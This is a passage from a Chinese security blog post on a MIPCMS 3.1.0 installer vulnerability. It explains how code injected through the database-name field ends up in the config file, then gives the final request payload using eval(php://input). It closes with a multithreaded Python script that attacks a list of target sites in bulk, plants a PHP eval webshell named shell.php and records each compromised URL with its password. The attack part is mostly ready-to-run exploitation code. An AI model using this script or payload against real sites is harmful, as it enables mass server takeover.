+<code>username password rpassword dbport dbname dbhost dbuser dbpw</code>
+用户名密码这些可以随便写，但是数据库这个在你不晓得数据库信息的时候是无法进行下去的，因为通过上面的代码分析，如果数据库连接不成功就会退出。
+看Bypass大表哥的方法，我一想，特么gb，我咋没想到这种方法呢，wocao。<code>dbhost</code>不是可以填服务器地址么，我们在一个服务器上面搭建一个然后进行连接不就行了么，哈哈哈。</li>
+<li>数据库的问题解决了，我们要怎么样写到数据库文件里面呢。写到里面的就有这几个值，数据库的服务器地址和用户名密码是不能动的了，因为Mysql用户默认是16位，可以修改位数，但是数据库会把<code>,</code>自动转换为<code>.</code>，数据库密码是加密的，还有<code>prefix</code>这个参数修改了会造成创建表的出现错误导致程序不能正常执行。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms14.png" alt=""></li>
+</ol>
+<p>那么我们构造的写进去的信息就不能破坏里面的结构，我们就只能用<code>dbname</code>了。
+3. 还有一个问题，如果我们直接构造一句话木马也不行，因为上面<code> $dbname=strtolower(input('post.dbname'))</code>这里用了转换小写，所以一句话的<code>$_POST</code>和<code>$_GET</code>就不能用了，不能用这个我们还可以用PHP的协议<code>php://input</code>来接受值然后用eval和assert来执行。
+我在这里就不再讲解这个协议了，论坛有一篇文章是专门讲这个的，还挺详细的：https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27441</p>
+<ol start="4">
+<li>从上面代码分析，我们可以看出，替换值后面会加上<code>',</code>，所以我们要对应上去
+<code>test',1=&gt;eval(file_get_contents('php://input')),'2'=&gt;'</code>
+<strong>最终的Payload：</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">username=admin&amp;password=admin&amp;rpassword=admin&amp;dbport=3306&amp;dbname=test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;&amp;dbhost=192.168.1.102&amp;dbuser=root&amp;dbpw=root
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x07-用python编写批量getshell脚本">0x07 用Python编写批量getshell脚本</h2>
+<p>我把配置都写在里面了，需要修改数据库信息直接在代码里面改了，如果加在参数会比较麻烦。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">#!/usr/bin/env
+#author:F0rmat
+import sys
+import requests
+import threading
+def exploit(target):
+    dbhost=&#39;192.168.1.102&#39;
+    dbuser = &#39;root&#39;
+    dbpw = &#39;root&#39;
+    dbport=3306
+    dbname=&#34;test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;&#34;
+    if sys.argv[1]== &#34;-f&#34;:
+        target=target[0]
+    url1=target+&#34;/index.php?s=/install/Install/installPost&#34;
+    data={
+        &#34;username&#34;: &#34;admin&#34;,
+        &#34;password&#34;:  &#34;admin&#34;,
+        &#34;rpassword&#34;: &#34;admin&#34;,
+        &#34;dbport&#34;: dbport,
+        &#34;dbname&#34;: dbname,
+        &#34;dbhost&#34;: dbhost,
+        &#34;dbuser&#34;: dbuser,
+        &#34;dbpw&#34;: dbpw,
+    }
+    payload = &#34;fwrite(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[f0rmat])?&gt;f0rmat&#39;);&#34;
+    url2=target+&#34;/system/config/database.php&#34;
+    shell = target+&#39;/system/config/shell.php&#39;
+    try:
+        requests.post(url1,data=data).content
+        requests.post(url2, data=payload)
+        verify = requests.get(shell, timeout=3)
+        if &#34;f0rmat&#34; in verify.content:
+            print &#39;Write success,shell url:&#39;,shell,&#39;pass:f0rmat&#39;
+            with open(&#34;success.txt&#34;,&#34;a+&#34;) as f:
+                f.write(shell+&#39;  pass:f0rmat&#39;+&#34;\n&#34;)
+        else:
+            print target,&#39;Write failure!&#39;
+    except Exception, e:
+        print e
+def main():
+    if len(sys.argv)&lt;3:
+        print &#39;python mipcms_3.1.0.py -h target/-f target-file &#39;
+    else:
+        if sys.argv[1] == &#34;-h&#34;:
+            exploit(sys.argv[2])
+        elif sys.argv[1] == &#34;-f&#34;:
+            with open(sys.argv[2], &#34;r&#34;) as f:
+                b = f.readlines()
+                for i in xrange(len(b)):
+                    if not b[i] == &#34;\n&#34;:
+                        threading.Thread(target=exploit, args=(b[i].split(),)).start()
+
+
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms15.png" alt=""></p>
+<h2 id="0x08-结束">0x08 结束</h2>
+<p>终于写完了，肚子好饿啊！
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/WeChat%20Image_20180326010117.jpg" alt=""></p>
+<p>我去敷面膜了，然后洗洗睡了～
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/WeChat%20Image_20180326010134.jpg" alt=""></p>
+<h2 id="0x09-参考">0x09 参考</h2>
+<p><a href="https://github.com/F0r3at/Python-Tools/tree/master/Mipcms">https://github.com/F0r3at/Python-Tools/tree/master/Mipcms</a>
+<a href="http://www.cnvd.org.cn/flaw/show/CNVD-2018-02516">http://www.cnvd.org.cn/flaw/show/CNVD-2018-02516</a>
+<a href="http://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=301419963&amp;idx=1&amp;sn=0cb82aa5629b6432415c93d9f2b8eb8c&amp;chksm=0b55dde63c2254f04399a7afa7f49a3889e8eaa37d747ec1a1b70f00cc0bf94c764db1295a11&amp;mpshare=1&amp;scene=23&amp;srcid=0321pbJgBla01aN1U5GZXNlG#rd">http://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=301419963&amp;idx=1&amp;sn=0cb82aa5629b6432415c93d9f2b8eb8c&amp;chksm=0b55dde63c2254f04399a7afa7f49a3889e8eaa37d747ec1a1b70f00cc0bf94c764db1295a11&amp;mpshare=1&amp;scene=23&amp;srcid=0321pbJgBla01aN1U5GZXNlG#rd</a></p>
+
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">F0rmat</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2018-03-26
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://xxe.icu/tags/mipcms/">MIPCMS</a>
+          <a href="https://xxe.icu/tags/getshell/">Getshell</a>
+          <a href="https://xxe.icu/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E/">每日一洞</a>
+          <a href="https://xxe.icu/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/vulnerability-alert_windows-7-meltdown-patch-discovery-vulnerability-allows-any-process-to-read-and-write-kernels/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">漏洞预警|Windows 7 Meltdown 补丁发现漏洞，允许任意进程读写内核</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/wordpress-plugin-site-editor-1.1.1-local-file-inclusion-analysis/">
+            <span class="next-text nav-default">Wordpress Plugin Site Editor 1.1.1 - 本地文件包含漏洞分析(每日一洞)</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="https://github.com/Secd0g/" rel="me noopener" class="iconfont"
+      title="github"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
+</svg>
+
+    </a>
+  
+    <a href="https://www.zhihu.com/people/F0rmat" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://xxe.icu/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
+  </span>
+
+  <span class="copyright-year">
+    &copy;
+    
+      2017 -
+    2022
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        F0rmat
+        
+      </span></span>
+
+  
+  
+    <span id="busuanzi_container">
+      访客数/访问量：<span id="busuanzi_value_site_uv"></span>/<span id="busuanzi_value_site_pv"></span>
+    </span>
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
